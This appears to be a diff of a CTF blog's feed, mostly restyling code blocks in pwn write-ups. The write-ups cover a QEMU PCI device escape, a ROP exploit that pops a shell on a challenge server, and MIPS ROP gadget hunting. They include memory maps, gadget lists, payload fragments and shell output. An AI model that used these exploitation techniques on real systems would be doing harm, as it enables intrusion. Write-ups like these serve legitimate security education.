@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/ctf/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/ctf/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-08-01T03:41:33+02:00</updated>
+    <updated>2022-08-02T13:40:56+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -3015,9 +3015,9 @@ The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
     </h2>
 </div>
 <p>We got several files:</p>
-<pre><code>$ ls
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ls
 build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
-</code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
+</code></pre></div><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
 <div class="highlight"><pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
 </span><span class="gh"></span>new file mode 100644
 <span class="gh">index 0000000000..f1c3f84b2a
@@ -3264,18 +3264,18 @@ build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_
 <p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
 <p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
 <p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
-<pre><code>/ # lspci -v
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/ <span class="c1"># lspci -v</span>
 00:01.0 Class 0601: 8086:7000
 00:00.0 Class 0600: 8086:1237
 00:01.3 Class 0680: 8086:7113
 00:01.1 Class 0101: 8086:7010
 00:02.0 Class 00ff: 1337:1337
-</code></pre><p>The output of the command is structured like this:</p>
-<pre><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
-Field 2 : 00ff    : device class
-Field 3 : 1337    : vendor ID
-Field 4 : 1337    : device ID
-</code></pre><p>According to the source code of the PCI device, the vendor ID and the device ID are <code>0x1337</code>, the resource file corresponding to the device is so <code>/sys/devices/pci0000:00/0000:00:02.0/resource0</code>.</p>
+</code></pre></div><p>The output of the command is structured like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Field <span class="m">1</span> : 00:02.0 : bus number <span class="o">(</span>00<span class="o">)</span>, device number <span class="o">(</span>02<span class="o">)</span> and <span class="k">function</span> <span class="o">(</span>0<span class="o">)</span>
+Field <span class="m">2</span> : 00ff    : device class
+Field <span class="m">3</span> : <span class="m">1337</span>    : vendor ID
+Field <span class="m">4</span> : <span class="m">1337</span>    : device ID
+</code></pre></div><p>According to the source code of the PCI device, the vendor ID and the device ID are <code>0x1337</code>, the resource file corresponding to the device is so <code>/sys/devices/pci0000:00/0000:00:02.0/resource0</code>.</p>
 <div class="gblog-post__anchorwrap">
     <h2 id="device-interactions">
         Device interactions
@@ -3426,38 +3426,38 @@ Field 4 : 1337    : device ID
     </h3>
 </div>
 <p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
-<pre><code>pwndbg&gt; vmmap                                                                                                                                                                              
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
-    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; vmmap                                                                                                                                                                              
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA                                                                                                                                            
+    0x559a884e1000     0x559a88791000 r--p   2b0000 <span class="m">0</span>      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
-    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a89100000     0x559a89262000 r--p   <span class="m">162000</span> c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
-    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
-    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
-    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
-    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
-    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
-    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
-    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
-    [SKIP]
+    0x559a89353000     0x559a89377000 rw-p    <span class="m">24000</span> <span class="m">0</span>      <span class="o">[</span>anon_559a89353<span class="o">]</span>                                                                                                                    
+    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 <span class="m">0</span>      <span class="o">[</span>heap<span class="o">]</span>                                                                                                                              
+    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 <span class="m">0</span>      <span class="o">[</span>anon_7fc5f4000<span class="o">]</span>                                                                                                              
+    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 <span class="m">0</span>      <span class="o">[</span>anon_7fc5f4a37<span class="o">]</span>                                                                                                                    
+    0x7fc5fbe00000     0x7fc603e00000 rw-p  <span class="m">8000000</span> <span class="m">0</span>      <span class="o">[</span>anon_7fc5fbe00<span class="o">]</span>                                                                                                                    
+    0x7fc603e00000     0x7fc603e01000 ---p     <span class="m">1000</span> <span class="m">0</span>      <span class="o">[</span>anon_7fc603e00<span class="o">]</span>                                                                                                                    
+    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 <span class="m">0</span>      <span class="o">[</span>anon_7fc604000<span class="o">]</span>                                                                                                                  
+    <span class="o">[</span>SKIP<span class="o">]</span>
 pwndbg&gt; search -4 0x7fc60400 -w                                                                                                                                                                
-[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
-[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
-[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
-[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
-[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
-[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
-[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
-[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
-[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
-[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
-[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
-[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
-[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
-[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
-[SKIP]
-</code></pre><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359002 0x7fc60400                                                                                                                                                     
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a8935904a 0x7fc60400                                                                                                                                                     
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359052 0x1600007fc60400                                                                                                                                               
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359062 0xffd300007fc60400                                                                                                                                             
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359072 0x7fc60400                                                                                                                                                     
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
+<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
+<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
+<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
+<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
+<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
+<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
+<span class="o">[</span>SKIP<span class="o">]</span>
+</code></pre></div><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
 <p>If I summarize we have:</p>
 <ul>
 <li>A reliable leak of:
@@ -3609,7 +3609,7 @@ Then, next time we send a read request, the shellcode will be executed! And we w
 </span><span class="cm">flag: flag{cloudinspect_inspects_your_cloud_0107}
 </span><span class="cm">*/</span>
 </code></pre></div><p>Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
-You can the final exploit <a
+You can take a look at the final exploit <a
   class="gblog-markdown__link"
   href="https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c"
   
@@ -4185,25 +4185,25 @@ So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</cod
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
-<pre><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
-[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">➜  abbr.d git:<span class="o">(</span>master<span class="o">)</span> ✗ python3 exploit.py <span class="nv">HOST</span><span class="o">=</span>168.119.108.148 <span class="nv">PORT</span><span class="o">=</span><span class="m">10010</span> 
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/pwn/asis2021/abbr.d/abbr&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE (0x400000)
-[+] Opening connection to 168.119.108.148 on port 10010: Done
-/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  res = self.recvuntil(delim, timeout=timeout)
-[*] Switching to interactive mode
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> Opening connection to 168.119.108.148 on port 10010: Done
+/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  <span class="nv">res</span> <span class="o">=</span> self.recvuntil<span class="o">(</span>delim, <span class="nv">timeout</span><span class="o">=</span>timeout<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 $ id
-uid=999(pwn) gid=999(pwn) groups=999(pwn)
+<span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span>
 $ ls
 chall
 flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
 $ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
-ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
-</code></pre><div class="gblog-post__anchorwrap">
+ASIS<span class="o">{</span>d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n<span class="o">}</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
     <h2 id="final-exploit">
         Final exploit
         <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
@@ -4257,10 +4257,6 @@ ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
 </span><span class="s1">b* 0x402036
 </span><span class="s1">continue
 </span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
-
-<span class="c1">#===========================================================</span>
-<span class="c1">#                    EXPLOIT GOES HERE</span>
-<span class="c1">#===========================================================</span>
 
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 
@@ -5310,27 +5306,27 @@ EXPOSE 4000
 EXPOSE 1234
 CMD socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&quot;
 </code></pre><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
-<pre><code>$ uname -a
-Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ uname -a
+Linux off 5.8.0-50-generic <span class="c1">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
 $ sudo apt install socat qemu-user libc6-mips64-cross
 Lecture des listes de paquets... Fait
-Construction de l'arbre des dépendances       
-Lecture des informations d'état... Fait
-socat est déjà la version la plus récente (1.7.3.3-2).
-libc6-mips64-cross est déjà la version la plus récente (2.30-0ubuntu2cross2).
-qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
-0 mis à jour, 0 nouvellement installés, 0 à enlever et 17 non mis à jour.
+Construction de l<span class="s1">&#39;arbre des dépendances       
+</span><span class="s1">Lecture des informations d&#39;</span>état... Fait
+socat est déjà la version la plus récente <span class="o">(</span>1.7.3.3-2<span class="o">)</span>.
+libc6-mips64-cross est déjà la version la plus récente <span class="o">(</span>2.30-0ubuntu2cross2<span class="o">)</span>.
+qemu-user est déjà la version la plus récente <span class="o">(</span>1:4.2-3ubuntu6.15<span class="o">)</span>.
+<span class="m">0</span> mis à jour, <span class="m">0</span> nouvellement installés, <span class="m">0</span> à enlever et <span class="m">17</span> non mis à jour.
 $ sudo rm -f /etc/ld.so.cache
-$ socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&quot;
-</code></pre><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
-<pre><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
+$ socat tcp-listen:4000,reuseaddr,fork exec:<span class="s2">&#34;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&#34;</span>
+</code></pre></div><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ gdb-multiarch -ex <span class="s1">&#39;source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py&#39;</span> -q ./mipsy
 Reading symbols from ./mipsy...
-(No debugging symbols found in ./mipsy)
-pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
-pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+<span class="o">(</span>No debugging symbols found in ./mipsy<span class="o">)</span>
+pwndbg: loaded <span class="m">196</span> commands. Type pwndbg <span class="o">[</span>filter<span class="o">]</span> <span class="k">for</span> a list.
+pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
 pwndbg&gt; target remote localhost:5445
 
-</code></pre><p>To send the payload  I used <a
+</code></pre></div><p>To send the payload  I used <a
   class="gblog-markdown__link"
   href="https://github.com/Gallopsled/pwntools"
   
@@ -5348,35 +5344,35 @@ pwndbg&gt; target remote localhost:5445
 <pre><code>$ python3 wu.py                                                               
 [+] Opening connection to localhost on port 4000: Done
 </code></pre><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
-<pre><code>Remote debugging using localhost:5445
-warning: Unable to find dynamic linker breakpoint function.
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Remote debugging using localhost:5445
+warning: Unable to find dynamic linker breakpoint <span class="k">function</span>.
 GDB will be unable to debug shared library initializers
 and track explicitly loaded dynamic code.
-0x00000040008038d0 in ?? ()
-Could not check ASLR: Couldn't get personality
-Downloading '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy' from the remote server: OK
-add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
-'context': Print out the current register, instruction, and stack context.
-Exception occurred: context: unsupported operand type(s) for +: 'NoneType' and 'int' (&lt;class 'TypeError'&gt;)
-For more info invoke `set exception-verbose on` and rerun the command
-or debug it by yourself with `set exception-debugger on`
+0x00000040008038d0 in ?? <span class="o">()</span>
+Could not check ASLR: Couldn<span class="s1">&#39;t get personality
+</span><span class="s1">Downloading &#39;</span>/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy<span class="s1">&#39; from the remote server: OK
+</span><span class="s1">add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
+</span><span class="s1">&#39;</span>context<span class="s1">&#39;: Print out the current register, instruction, and stack context.
+</span><span class="s1">Exception occurred: context: unsupported operand type(s) for +: &#39;</span>NoneType<span class="s1">&#39; and &#39;</span>int<span class="s1">&#39; (&lt;class &#39;</span>TypeError<span class="err">&#39;</span>&gt;<span class="o">)</span>
+For more info invoke <span class="sb">`</span><span class="nb">set</span> exception-verbose on<span class="sb">`</span> and rerun the <span class="nb">command</span>
+or debug it by yourself with <span class="sb">`</span><span class="nb">set</span> exception-debugger on<span class="sb">`</span>
 pwndbg&gt; vmmap
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-       0x120000000        0x12002e000 r-xp    2e000 0      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+       0x120000000        0x12002e000 r-xp    2e000 <span class="m">0</span>      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
        0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-       0x12003d000        0x120040000 r--p     3000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-       0x120040000        0x120043000 rw-p     3000 30000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-      0x4000403000       0x4000828000 r--p   425000 0      &lt;explored&gt;
-      0x40007fe000       0x4000801000 rw-p     3000 0      [stack]
+       0x12003d000        0x120040000 r--p     <span class="m">3000</span> 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+       0x120040000        0x120043000 rw-p     <span class="m">3000</span> <span class="m">30000</span>  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+      0x4000403000       0x4000828000 r--p   <span class="m">425000</span> <span class="m">0</span>      &lt;explored&gt;
+      0x40007fe000       0x4000801000 rw-p     <span class="m">3000</span> <span class="m">0</span>      <span class="o">[</span>stack<span class="o">]</span>
 
-[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
-pwndbg&gt; continue
+<span class="o">[</span>QEMU target detected - vmmap result might not be accurate<span class="p">;</span> see <span class="sb">`</span><span class="nb">help</span> vmmap<span class="sb">`</span><span class="o">]</span>
+pwndbg&gt; <span class="k">continue</span>
 Continuing.
-warning: Could not load shared library symbols for 2 libraries, e.g. /lib/libc.so.6.
-Use the &quot;info sharedlibrary&quot; command to see the complete listing.
-Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
-[Inferior 1 (process 1) exited normally]
-</code></pre><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
+warning: Could not load shared library symbols <span class="k">for</span> <span class="m">2</span> libraries, e.g. /lib/libc.so.6.
+Use the <span class="s2">&#34;info sharedlibrary&#34;</span> <span class="nb">command</span> to see the <span class="nb">complete</span> listing.
+Do you need <span class="s2">&#34;set solib-search-path&#34;</span> or <span class="s2">&#34;set sysroot&#34;</span>?
+<span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 1<span class="o">)</span> exited normally<span class="o">]</span>
+</code></pre></div><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
 <pre><code>+---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
@@ -5400,9 +5396,9 @@ Menu:
     </h2>
 </div>
 <p>We can take a look at the binary by running the file command:</p>
-<pre><code>$ file mipsy                                                                  
-mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
-</code></pre><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ file mipsy                                                                  
+mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld.so.1, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e20cf7872e96482095ce68e6d4d03806d5928de4, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
+</code></pre></div><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
 <pre><code>+---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
@@ -5703,23 +5699,23 @@ The code looks like such:</p>
 <li>set <code>$gp</code>, the global pointer to the right value to be able do execute the <code>dla</code> instruction.</li>
 </ul>
 <p>An important thing to notice is that on mips architechture, when an instruction is executed the next instruction is too executed despite of the result of the current instruction. So when we will choose our gadgets, we need to be careful according to the instruction after the control flow instruction.</p>
-<p>And the good value for <code>$gp</code> is a constant from which the <a
+<p>And the good value for <code>$gp</code> is a constant for which the <a
   class="gblog-markdown__link"
   href="https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html"
   
   ><code>dla</code></a
-> instruction addresses memory areas. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
+> instruction addresses a valid memory area. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
 <p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
 <pre><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
 </code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
 <pre><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
 </code></pre><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
 <p>We can apply process to find a gadget for $v1:</p>
-<pre><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
-[skip]
-0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
-[skip]
-</code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ grep <span class="s2">&#34;ld \$v1, &#34;</span> gadgets <span class="p">|</span> grep <span class="se">\$</span>sp
+<span class="o">[</span>skip<span class="o">]</span>
